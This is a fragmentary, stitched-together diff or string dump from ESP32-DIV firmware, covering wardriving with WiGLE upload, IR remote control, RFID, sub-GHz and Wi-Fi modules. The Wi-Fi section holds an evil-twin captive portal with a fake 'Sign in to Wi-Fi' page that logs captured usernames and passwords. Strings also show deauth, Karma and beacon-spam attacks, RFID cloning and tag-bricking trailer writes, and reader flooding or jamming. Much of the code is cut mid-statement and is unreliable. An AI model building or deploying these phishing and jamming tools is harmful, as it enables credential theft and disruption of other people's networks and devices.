+  const bool csvDirty = fullPaint || strncmp(safePath, s_wardMainSnap.path, sizeof(s_wardMainSnap.path)) != 0;
+  const WardRadioMode rm = (WardRadioMode)s_cfgRadioMode;
+  const bool radioDirty = fullPaint || (uint8_t)rm != s_wardMainSnap.radio ||
+                          s_cfgScanMs != s_wardMainSnap.scanMs || s_cfgMaxAps != s_wardMainSnap.maxAps;
+  const bool fix = (fixQuality > 0) && !isnan(navLat) && !isnan(navLon);
+  int hcNow = -1;
+  if (hdopLive >= 0.f) {
+    hcNow = (int)lroundf(hdopLive * 100.f);
+  }
+  int32_t latNow = INT32_MIN;
+  int32_t lonNow = INT32_MIN;
+  if (!isnan(navLat)) {
+    latNow = (int32_t)lroundf((float)navLat * 1e5f);
+  }
+  if (!isnan(navLon)) {
+    lonNow = (int32_t)lroundf((float)navLon * 1e5f);
+  }
+  int16_t altNow = INT16_MIN;
+  if (!isnan(navAltM)) {
+    altNow = (int16_t)lroundf((float)navAltM);
+  }
+  const bool gpsDirty = fullPaint || fixQuality != s_wardMainSnap.fixQ ||
+                        satsUsedGga != s_wardMainSnap.sats || hcNow != s_wardMainSnap.hdopCenti ||
+                        latNow != s_wardMainSnap.latE5 || lonNow != s_wardMainSnap.lonE5 ||
+                        altNow != s_wardMainSnap.altM;
+  if (fullPaint) {
+    tft.fillRect(0, kWardBodyY, scrW, contentBottom - kWardBodyY, FEATURE_BG);
+  }
+  uiSetTextDatum(TL_DATUM);
+
+  if (heroDirty) {
+  const int innerY = layout.heroY + kWardInnerPad;
+  const int textX = wardCardTextX(pad);
+  tft.fillRoundRect(pad, layout.heroY, cardW, layout.heroH, kWardUiRadius, UI_FG);
+  tft.drawRoundRect(pad, layout.heroY, cardW, layout.heroH, kWardUiRadius, UI_LINE);
+  tft.fillRoundRect(pad + 3, innerY, 3, layout.heroH - kWardInnerPad * 2, 2, ORANGE);
+  tft.drawBitmap(pad + kWardInnerPad, innerY, bitmap_icon_satellite, 16, 16, UI_ICON);
+  uiSetTextFont(1);
+  uiSetTextColor(UI_TEXT, UI_FG);
+  uiDrawString(
+;
+  osKeyboardUseStandardLayout(cfg);
+  cfg.maxLen = maxKbLen;
+  cfg.shuffleNames = nullptr;
+  cfg.shuffleCount = 0;
+  cfg.buttonsY = 195;
+  cfg.backLabel = 
+;
+  uiDrawString(wardFitTextWidth(autoLine, cardW - kWardInnerPad * 2), pad + kWardInnerPad,
+                 y4 + (kWigleRowH - 8) / 2);
+}
+
+static int wardPollWigleCfgCombinedHit() {
+  int x = 0, y = 0;
+  if (!readTouchXYDismiss(x, y)) {
+    return -1;
+  }
+  const uint32_t t = millis();
+  if ((uint32_t)(t - s_lastWardInputMs) < 120u) {
+    return -1;
+  }
+  s_lastWardInputMs = t;
+  if (y > kWardIconRowY && y < kWardIconRowY + kWardIconRowH) {
+    int16_t ix[4];
+    wardToolbarIconXs(WardPage::WigleCfg, ix);
+    if (x > ix[0] && x < ix[0] + kWardIconSz) {
+      s_lastTbMs = t;
+      return 0;
+    }
+    if (x > ix[3] && x < ix[3] + kWardIconSz) {
+      s_lastTbMs = t;
+      return 3;
+    }
+    return -1;
+  }
+  const int row = wardWigleHitBodyRow(x, y);
+  if (row >= 0) {
+    return 10 + row;
+  }
+  return -1;
+}
+
+static int wardWifiChannelToMHz(int ch) {
+  if (ch >= 1 && ch <= 13) {
+    return 2412 + (ch - 1) * 5;
+  }
+  if (ch == 14) {
+    return 2484;
+  }
+  if (ch >= 32) {
+    return 5000 + ch * 5;
+  }
+  return 0;
+}
+
+static void wardMacToLowerColons(char* mac) {
+  if (!mac) {
+    return;
+  }
+  for (char* p = mac; *p; ++p) {
+    if (*p >= 'A' && *p <= 'Z') {
+      *p = (char)(*p - 'A' + 'a');
+    }
+  }
+}
+
+static void wardAuthToWigleCaps(const char* auth, char* out, size_t outSz) {
+  if (!out || outSz < 8u) {
+    return;
+  }
+  out[0] = '\0';
+  if (!auth || !auth[0]) {
+    snprintf(out, outSz, 
+AccuracyMeters,RCOIs,MfgrId,Type\r\n
+Auth encode failed.
+BD
+BDS
+BLE
+BLE only
+BleCompat.h
+Center=overhead  Edge=horizon
+Content-Disposition: form-data; name=\"donate\"\r\n\r\n
+Content-Disposition: form-data; name=\"file\"; filename=\"
+Content-Type: text/csv\r\n\r\n
+Converted file empty or missing.
+Could not read ward CSV or convert.
+Could not write temp CSV on SD.
+GA
+GAL
+GL
+GLO
+HTTP/
+KeyboardUI.h
+MAC,SSID,AuthMode,FirstSeen,Channel,Frequency,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,
+Misc [LE]
+POST /api/v2/file/upload HTTP/1.1\r\nHost: api.wigle.net\r\n
+QZ
+QZS
+SD:/config/wigle.txt — line1: WiGLE API name, line2: token. If this ESP32 already 
+TLS connect failed
+Touch: L/R view  center scroll
+Touch: edge L/R switches view
+Touchscreen.h
+UTC
+User-Agent: ESP32-DIV-Wardrive/1\r\n
+W+B
+WAPI_PSK
+WEP
+WIFI
+WPA2_ENT
+WPA2_PSK
+WPA2_WPA3_PSK
+WPA3_PSK
+WPA_PSK
+WPA_WPA2_PSK
+WiFi connect failed (check wigle.txt SSID/pass).
+WiFi failed. Connect this device to Wi‑Fi once in another tool, 
+WiFi only
+WiFi+BLE
+WiGLE: WiFi OK
+WiGLE: convert
+WiGLE: start
+WigleWifi-1.6,appRelease=1.0,model=ESP32-DIV,release=1.0,device=wardrive,display=,board=ESP32,
+\"\r\n
+\r\n
+\r\n--
+api.wigle.net
+brand=ESP32-DIV,star=Sol,body=3,subBody=0\r\n
+false\r\n
+freertos/FreeRTOS.h
+freertos/task.h
+gps.h
+icon.h
+joined Wi‑Fi once, stop at line 2. Else add line3=SSID line4=password. Optional 
+line3 AUTO or - uses saved Wi‑Fi only.
+mbedtls/base64.h
+no GSV
+or add SSID + password on lines 3–4 of wigle.txt.
+ring=fix
+shared.h
+utils.h
+
+=== i18n.cpp ===
+i18n.h
+i18n_table.h
+utils.h
+zh_font.h
+
+=== ip5306.cpp ===
+Recover: short-press KEY or power up with USB first.
+[IP5306] 0x75 RESPONDING -> chip is the I2C version, driver will work
+[IP5306] 0x75 missing (bus alive) -> IP5306 I2C not initialized this power-up. 
+[IP5306] 0x75 missing and nothing else on bus -> check SDA/SCL wiring/solder
+[IP5306] scan: NO device responded (bus dead / no pull-ups / Wire not begun)
+[IP5306] scanning I2C bus 0x03-0x77 ...
+ip5306.h
+
+=== ir.cpp ===
+   Auto: 
+ A:0x
+ C:0x
+ V:0x
+ kHz IR
+ profiles
+ pulses  Bits: 
+AIR
+ALL
+Bad khz
+Bad protocol
+Bad rawLen
+Built-in
+Built-in (SD: 
+CABLE
+CHANDOWN
+CHANNELDOWN
+CHANNELUP
+CHANUP
+CHDN
+CHDOWN
+CHMINUS
+CHPLUS
+CHUP
+Cannot create /ir
+Carrier: 
+DENON
+DISH
+DN
+Denon AVR
+ENTER
+EPSON
+EXIT
+Epson Projector
+Fan
+GI Cable
+GICABLE
+Graph: +/- zoom  tap L/R pan
+IR
+JVC
+JVC VCR
+KASEIKYO
+Key not available in this profile
+Key: 
+Key: --
+KeyboardUI.h
+LG
+LG TV (common)
+LG2
+Lamp
+Loaded 
+Mute
+NEC
+NECLIKE
+No /ir
+No /ir_profiles.json or /ir_profiles/
+No profiles
+No profiles in /ir_profiles/
+OFF
+ON
+Open /ir failed
+Open /ir_profiles failed
+Open /ir_profiles.json failed
+Open file failed
+PANASONIC
+PIONEER
+PLAYSTATION
+POWER
+Panasonic
+Pioneer
+Projector
+Protocol not enabled in build
+RC5
+RC5X
+RC6
+RECEIVER
+RETURN
+Raw read failed
+Raw: 
+Raw: --
+Read hdr failed
+Read raw failed
+Receiver
+Repeat: 
+SAMSUNG
+SAMSUNG32
+SAMSUNG36
+SD card
+SD not available
+SD not available.
+SD: 
+SELECT
+SIRC
+SONY
+SOUNDBAR
+Samsung TV (common)
+Sony TV (common)
+Too many files in /ir
+Touchscreen.h
+Type: 
+Type: --
+VDN
+VOLDN
+VOLDOWN
+VOLM
+VOLMINUS
+VOLP
+VOLPLUS
+VOLUMEDOWN
+VOLUMEUP
+VOLUP
+VUP
+VolDn
+VolUp
+Waveform 
+XBOX
+Xbox 360
+[!] Name this IR capture
+[!] No capture for auto
+[!] Saving...
+[!] Sending...
+[*] Auto 
+[*] Graph pan +
+[*] Graph pan -
+[*] Point remote and press
+[*] Zoom 
+[+] IR Record ready
+[+] Saved 
+[+] Send done
+[+] Signal captured
+icon.h
+kHz:
+or /ir_profiles/*.json
+shared.h
+utils.h
+
+=== rfid.cpp ===
+ (partial — some blocks need other keys)
+(Interpret with MFC access-bit tables for your sector.)
+Aborted mid-write.
+Access bits may brick the tag.
+At least one trailer write succeeded.
+Back cancels without writing anything.
+Bad access bits can brick a tag.\n\n
+Blank must match source family.
+Block 4 write was rejected.
+Block 7
+CAUTION
+Classic tag
+Classic tag — block 4 erase
+Classic tag — hold on coil (~12 s window)
+Classic — reading data blocks
+Clears MIFARE Classic data block 4 (16 bytes to 00) using default key A.\n\n
+Clone aborted mid-write.
+Clone finished with some errors.
+Could not authenticate block 4 with key A.
+Could not classify tag.\nNeed Classic, Ultralight, or NTAG.
+Could not read block 7 (sector 1 trailer).
+DESFire
+DESFire / ISO-DEP-style tag detected.\n
+DETAILS
+DONE
+Default keys (A/B) and zero. UID block may stay factory.
+Default keys (A/B) and zero.\nUID byte clone on Gen2 \"magic\" cards when detected.
+Disrupt active
+Dump targets Classic or Ultralight/NTAG.\nTag did not match.
+Dumping MIFARE Classic
+Dumping pages
+FF / 00 / random payloads
+Fail
+Family could not be determined from quick probes.
+Finished
+Flooding external reader
+Hold a Classic tag on the coil.
+Hold the tag flat on the coil. UID, tag type, and memory samples appear here after scan.
+INFO
+JAM
+Jam active
+Keep the tag on the coil until reading finishes.
+LEFT / SELECT: close
+LEFT: Back   SELECT: action
+Listening — present ISO14443A tag
+Lost
+MIFARE Classic
+Mode: 
+NTAG
+Next >
+No blocks/pages could be read.\nCheck tag position and keys.
+No tag
+No trailer writes succeeded.
+No write
+No writes
+Only MIFARE Classic sector trailers.
+Only use tags you own or are allowed to modify.\n\n
+PN532
+PN532 (version not cached)
+PROGRESS
+Pages 4–7 could not all be read.
+Passive ISO14443A read.\n\n
+Patterns alternate FF / 00 / random on trailers.\n
+Preparing target mode...
+Present a Classic tag (~12 s window).
+Present a Classic tag on the coil.
+Present tag on the coil.
+Present tag to dump
+Protocol: ISO14443A
+Puts the PN532 into ISO14443A target mode and sends rapid replies toward 
+READY
+RESULT
+RFID
+Reader RF collision / flood
+Reader: 
+Reader: PN532
+Reading MIFARE Classic blocks 0–63.\nFull hex on Serial Monitor.
+Reading Ultralight / NTAG user pages.\nFull hex on Serial Monitor.
+Reading source Classic data blocks 0–47.
+Reading source Ultralight / NTAG user pages.
+Reads Classic blocks 0–63 or UL/NTAG user pages.\n\n
+Reads MIFARE Classic sector 1 trailer (block 7) and shows raw access bytes.\n
+Remove the source tag from the coil, then tap Clone to present a blank tag 
+Rotating trailer pattern
+Rotating trailer write patterns.\n16 sector trailers targeted.
+SAM reconfigured.
+SAM reconfigured; reader mode restored.
+SCAN
+Sector 0 block 0 (read with key A = FF FF FF FF FF FF):\n
+Sector 0 block 0 was not readable using default key A (FF FF FF FF FF FF).
+SettingsStore.h
+Skipped
+Some blocks were skipped (auth/key).\n
+Some blocks/pages did not read.\nCheck keys or tag damage.
+Source data is stored in device memory.\n\n
+Source tag detected
+Step 1/4 — Present SOURCE tag
+Step 1/4: present the SOURCE tag on the coil.
+Step 2/4 — Read source
+Step 3/4 — Confirm clone
+Step 4/4 — Present BLANK tag
+Step 4/4: present a blank tag of the same type as the source.\n\n
+Stop ends the session.
+Summary here; full hex prints on Serial Monitor.\n\n
+Target mode: cycles payloads (FF / 00 / random) on each exchange.\n
+This erase only targets MIFARE Classic.
+This tool only dumps UID here; full DESFire ops need other APDUs.
+Touchscreen.h
+Type mismatch
+Ultralight
+Ultralight / NTAG are not erased by this mode.\n\n
+Ultralight / NTAG — user pages
+Use only on gear you own or are permitted to test.\n\n
+User memory sample (pages 4–7, 4 bytes each):\n
+Uses default keys A/B.\n\n
+WARN
+WORK
+WRITE
+Waiting for reader
+Writes sector trailer blocks on MIFARE Classic (default key A).\n
+Writing copied Classic blocks to blank tag.
+Writing copied pages to blank tag.
+Writing sector trailers
+Writing starts automatically after the blank tag is detected.
+Writing — Classic
+Writing — Ultralight / NTAG
+[*] Ready — listening again...
+[*] Ready — waiting for reader...
+[*] Waiting for external reader...
+[*] Waiting for tag...
+[+] Blank 
+[+] Reader detected
+[+] Reader reconnected
+[+] Source 
+[+] Tag detected 
+\n--- RFID Dump Classic ---
+\n--- RFID Dump Ultralight / NTAG ---
+\n\n
+an external reader.\n\nKeep antennas close to the reader coil.\n\n
+detected (UID block attempted)
+icon.h
+not detected
+of the same type.\n\n
+rfid.h
+shared.h
+utils.h
+
+=== shared.h ===
+BoardConfig.h
+CYD
+CYD ESP32-2432S028R
+ESP32-DIV
+ESP32-DIV V1 ESP32U
+ESP32-DIV V2
+ESP32_DIV_V1
+ESP32_DIV_V2
+GENERIC
+SD Fail
+SD OK
+Select only one board: BOARD_ESP32_DIV_V2, BOARD_ESP32_DIV_V1, or BOARD_CYD
+Unknown board: define BOARD_ESP32_DIV_V2, BOARD_ESP32_DIV_V1, or BOARD_CYD
+v1.7.2
+
+=== subconfig.h ===
+arduinoFFT.h
+shared.h
+utils.h
+
+=== subghz.cpp ===
+ MHz
+Frequency mode: 
+Idle   
+Jamming mode: 
+KeyboardUI.h
+MAN 
+Name: 
+Profiles saved: 
+Sending 
+Switched to: 
+Touchscreen.h
+Value: 
+[RAS] 1 spi pins
+[RAS] 2 eeprom
+[RAS] 2a pre-clear
+[RAS] 2b cleared
+[RAS] 2c status drawn
+[RAS] 2d touch ready
+[RAS] 2e pcf ready
+[RAS] 2f palette
+[RAS] 2g invalidate
+[RAS] 2h updateDisplay
+[RAS] 2i navchrome
+[RAS] 3 pre-init
+[RAS] 4 init done
+[RAS] 5 arming rx
+[RAS] 6 armed, entering loop
+config.h
+i18n.h
+icon.h
+profiles_current.bin
+shared.h
+
+=== utils.cpp ===
+ B
+ Serial Terminal - 
+ Serial Terminal Active 
+ baud 
+Contact:      
+Developed by: 
+EN
+GitHub:       
+Items: 
+OFF
+ON
+SD Card detected
+SD Card removed
+Touchscreen.h
+Version:      
+Website:      
+ZH
+[Dark]
+[Light]
+[PCF8574] not found (scanned 0x20-0x27)
+[sd] mount failed — will not retry until reboot
+\n
+by 
+config.h
+driver/gpio.h
+freertos/FreeRTOS.h
+freertos/task.h
+gps.h
+i18n.h
+icon.h
+ip5306.h
+shared.h
+statusBar
+utils.h
+
+=== utils.h ===
+SettingsStore.h
+Touchscreen.h
+shared.h
+
+=== wifi.cpp ===
+ -> SD:/captive_portal/eeprom_dump.csv
+ attacks)
+ dBm
+ to 
+ | CH: 
+ | RSSI: 
+' || c == '\n' || c == '\r') { needsQuotes = true; break; }
+  }
+  if (!needsQuotes) return s;
+
+  String out = 
+') out += 
+(Hidden)
+(hidden)
+)) {
+          server.close();
+          WiFi.disconnect();
+          drawMenu();
+          return;
+        }
+        int x, y;
+        if (readTouchXY(x, y) && fwActionPressed(
+)) {
+    feature_exit_requested = true;
+    delay(200);
+    return;
+  }
+
+  int x, y;
+  if (readTouchXY(x, y)) {
+    if (fwActionPressed(
+);
+
+  if (!MDNS.begin(host)) {
+    uiSetTextColor(UI_WARN, TFT_BLACK);
+    uiSetCursor(10, 40 + yshift);
+    uiPrintln(
+);
+
+  server.on(
+);
+      delay(2000);
+      ESP.restart();
+    } else {
+      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
+      uiSetCursor(10, 10 + yshift);
+      uiSetTextColor(UI_WARN, TFT_BLACK);
+      uiPrintln(
+);
+      drawTabBar(
+);
+      uiSetTextColor(TFT_WHITE, TFT_BLACK);
+      uiSetCursor(10, 20 + yshift);
+      uiPrintln(
+);
+    bool success = !Update.hasError();
+    server.send(200, 
+);
+    drawTabBar(
+);
+    if (success) {
+      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
+      uiSetCursor(10, 10 + yshift);
+      uiSetTextColor(TFT_GREEN, TFT_BLACK);
+      uiSetTextSize(1);
+      uiPrintln(
+);
+    server.send(200, 
+);
+    uiSetCursor(10, 50 + yshift);
+    uiPrintln(
+);
+  uiSetCursor(10, 130 + yshift);
+  uiPrintln(
+);
+  uiSetCursor(10, 90 + yshift);
+  uiPrintln(
+);
+  uiSetTextColor(TFT_WHITE, TFT_BLACK);
+  uiSetCursor(10, 120 + yshift);
+  uiPrintln(
+, HTTP_GET, []() {
+    server.sendHeader(
+, HTTP_POST, []() {
+    server.sendHeader(
+, false);
+      fwRestoreNavChrome();
+      int x, y;
+      if (waitForTouchXY(x, y)) {
+        server.close();
+        WiFi.disconnect();
+        drawMenu();
+        return;
+      }
+      performWebOTAUpdate();
+    }
+  }, [&inUpdate, &totalUploaded]() {
+    HTTPUpload& upload = server.upload();
+    if (upload.status == UPLOAD_FILE_START) {
+      tft.fillRect(0, 37, 240, 320, TFT_BLACK);
+      uiSetCursor(10, 10 + yshift);
+      uiSetTextColor(TFT_WHITE, TFT_BLACK);
+      uiSetTextSize(1);
+      uiPrintln(
+, false);
+    fwRestoreNavChrome();
+    int x, y;
+    if (waitForTouchXY(x, y)) {
+      WiFi.disconnect();
+      drawMenu();
+      return;
+    }
+    performWebOTAUpdate();
+    return;
+  }
+  uiSetTextColor(TFT_GREEN, TFT_BLACK);
+  uiSetCursor(10, 110 + yshift);
+  uiPrintln(
+, false, 
+, loginIndex);
+  });
+  server.on(
+, percent);
+    } else if (upload.status == UPLOAD_FILE_END) {
+      if (Update.end(true)) {
+        Serial.printf(
+, serverIndex);
+  });
+  server.on(
+, success ? 
+, true);
+      totalUploaded = 0;
+      inUpdate = true;
+      if (!Update.begin(UPDATE_SIZE_UNKNOWN)) {
+        Update.printError(Serial);
+      }
+    } else if (upload.status == UPLOAD_FILE_WRITE) {
+      if (Update.write(upload.buf, upload.currentSize) != upload.currentSize) {
+        Update.printError(Serial);
+      }
+      totalUploaded += upload.currentSize;
+      int percent = (totalUploaded * 100) / (upload.totalSize ? upload.totalSize : 1000000);
+      tft.fillRect(10, 30 + yshift, 220, 10, TFT_BLACK);
+      uiSetCursor(10, 30 + yshift);
+      uiSetTextColor(TFT_WHITE, TFT_BLACK);
+      tft.printf(
+, upload.totalSize);
+      } else {
+        Update.printError(Serial);
+      }
+      totalUploaded = 0;
+      inUpdate = false;
+    }
+  });
+
+  server.begin();
+  fwEnsureToolbar();
+
+  uint32_t lastInputMs = 0;
+  while (true) {
+    server.handleClient();
+    const uint32_t now = millis();
+    if ((uint32_t)(now - lastInputMs) >= 50u) {
+      lastInputMs = now;
+      if (featureHasTouchNavBar()) {
+        maintainTouchNavBar();
+      }
+      if (feature_exit_requested) {
+        server.close();
+        WiFi.disconnect();
+        return;
+      }
+      if (!inUpdate) {
+        if (fwActionPressed(
+, x, y, true)) {
+          server.close();
+          WiFi.disconnect();
+          drawMenu();
+          return;
+        }
+      }
+    }
+    delay(1);
+  }
+}
+
+void updateSetup() {
+
+  fwResetNavCache();
+  tft.fillScreen(TFT_BLACK);
+  tft.drawFastHLine(0, 19, 240, UI_LINE);
+
+  uiSetTextColor(TFT_WHITE, TFT_BLACK);
+  uiSetTextSize(0);
+
+  setupTouchscreen();
+
+  uiDrawn = false;
+
+  float currentBatteryVoltage = readBatteryVoltage();
+  drawStatusBar(currentBatteryVoltage, true);
+  runUI();
+
+  drawMenu();
+}
+
+void updateLoop() {
+
+  if (featureHasTouchNavBar()) {
+    maintainTouchNavBar();
+    if (isTouchNavButtonPressedEdge(BTN_LEFT)) {
+      feature_exit_requested = true;
+      return;
+    }
+  } else if (feature_active && isButtonPressed(BTN_SELECT)) {
+    feature_exit_requested = true;
+    return;
+  }
+
+  updateStatusBar();
+  runUI();
+  if (feature_exit_requested) return;
+
+  if (fwActionPressed(
+<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>
+</style></head><body><div class='box'><h2>Sign in to Wi-Fi</h2>
+<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>
+<button type='submit'>Connect</button></form></div></body></html>
+<form method='POST' action='/login'>
+<h1>Login Successful!</h1><p>You are now connected.</p>
+<h3>Connecting...</h3></body></html>
+<hidden>
+<html><body style='font-family:sans-serif;text-align:center;padding:40px'>
+<input name='password' type='password' placeholder='Password' required>
+<input name='username' placeholder='Username' required>
+<title>Wi-Fi Login</title><style>
+ARP Hosts:
+ARP Scanning.
+ARP failed.
+Access Point started
+Access Point stopped
+Add = seed a test SSID
+All credentials cleared from 
+Android /generate_204 requested
+Attack already active
+Attack already inactive
+BSSID: 
+Back button pressed
+Bob's_Wifi_Burgers
+CLIENTS
+Captured Credentials:
+Channel: 
+Check password / signal.
+Cheese_Bandit
+Clear All button pressed
+Click_and_Die
+Credential deleted at index 
+Credential saved at address 
+DNS server started
+DNS server stopped
+Definitely_Not_A_Spy
+Delete button pressed for credential 
+Disabled
+DropItLikeItsHotspot
+ESP32-DIV
+ESP32DIV_AP
+Enabled 
+Encryption: 
+Error: Credential clear would overwrite counter!
+Est. Distance: 
+Export button pressed
+Export failed: SD not ready
+Exported 
+Force kicks clients to elicit
+Force: deauth clients so they
+FreeWiFi
+Free_WiFi_Promise
+Get_Your_Own_WiFi
+HideYoKidsHideYoWiFi
+HomeWiFi
+IP Address: 
+IP: 
+IPFreely
+I_AM_Watching_You
+Invalid credential count, resetting to 0
+Invalid credential index: 
+ItHurtsWhen_IP
+ItsOver9000
+Join a network first.
+Join failed.
+Karma
+KeyboardUI.h
+LAN_of_the_Free
+Learned list + beacons (Shuffle ok)
+Location
+Login page (/login.html) requested
+LookMaNoCables
+Looking for nearby APs
+Meme_LANd
+Microsoft Connect Test
+Microsoft NCSI
+Mom_UseThisOne
+NSA_Surveillance_Van
+New SSID set: 
+Next button pressed
+No SSIDs - Start or Add
+No network interface.
+No networks found
+NoInternetHere
+No_More_Data
+Not connected.
+Not found: 
+Not_for_You
+OopsAllSSID
+Overclocked_Toaster
+Panic!_At_the_WiFi
+Password cannot be empty!
+Password required!
+Password: 
+Pikachu_Used_WiFi
+Press Scan to retry or Back to cancel
+PrettyFlyForAWiFi
+Prev button pressed
+Probing local subnet.
+Quantum_Tunnel
+RSSI: 
+Ready - press Start
+Required to join AP for ARP scan
+Root (/) requested
+Router?IHardlyKnewHer
+SSID cannot be empty!
+SSID: 
+SSIDS
+SettingsStore.h
+ShutUpAndConnect
+Signal: 
+TX/S
+Tell_My_WiFi_LoveHer
+TestKarma
+TheLANBeforeTime
+Top: waiting...
+Touchscreen.h
+URL: http:
+  uiSetCursor(10, 80 + yshift);
+  uiPrintln(
+Undercover_Potato
+Username: 
+WEP
+WPA
+WPA*
+WPA-PSK
+WPA/WPA2
+WPA/WPA2-PSK
+WPA2
+WPA2-Ent
+WPA2-PSK
+WPA3
+WPA3*
+Waiting for probes...
+Web server started
+Web server stopped
+Why_Tho?
+Wi-Fight_The_Power
+WiFi_Fairy
+Windows /connecttest.txt requested
+Windows /ncsi.txt requested
+Wu-Tang_LAN
+[!!!] HIGH DEAUTH ATTACK on 
+[!] Client joined
+[!] Cycling all SSIDs
+[!] Deauth Attack on: 
+[!] Enter the Wi-Fi password for the
+[!] Evil Twin: 
+[!] Hidden SSID Detected!
+[!] Non-Standard Channel: 
+[!] Preparing
+[!] Press [Select] to Exit
+[!] SSID list ready
+[!] Scanning Stopped
+[!] Seed SSID for Karma
+[!] Set the SSID that your AP will use
+[!] WiFi password
+[*] Add cancelled
+[*] Answers probe SSIDs
+[*] Checking for Suspicious Networks
+[*] Cleared learned SSIDs
+[*] Client left
+[*] Portal ready
+[*] Press Start to beacon/answer
+[*] Scanning WiFi networks
+[*] Start, or Add to seed
+[*] Starting broadcast
+[*] Starting deauth monitor
+[*] Stopped
+[*] Waiting for probes...
+[+] LIVE - answering probes
+[PCAP] PacketMonitor: SD/PCAP logging not started (no SD or open failed).
+[SD] Captive capture appended to /captive_portal/captured.csv
+[SD] Captive capture export failed (SD not mounted / write error)
+\r\n
+assoc/probe frames with SSID.
+bgWifiScan
+body{font-family:Arial,sans-serif;text-align:center;padding:24px;background:#f2f2f2}
+config.h
+deauth123
+esp32
+esp_timer.h
+esp_wifi.h
+freertos/FreeRTOS.h
+freertos/queue.h
+freertos/task.h
+iOS /captive.apple.com requested
+iOS /hotspot-detect.html requested
+icon.h
+index,ssid,username,password\r\n
+lwip/etharp.h
+lwip/netif.h
+millis,remote_ip,ssid,username,password\r\n
+nvs_flash.h
+packetmonitor32
+reassociate and leak SSID.
+selected network. ^ caps, # sym
+shared.h
+text/html
+text/plain
+to host the captive portal. ^ caps, # sym
+utils.h
+
+=== wificonfig.h ===
+WiFi.h
+arduinoFFT.h
+esp_event.h
+esp_event_loop.h
+esp_system.h
+esp_wifi.h
+esp_wifi_types.h
+nvs_flash.h
+shared.h
+utils.h
+
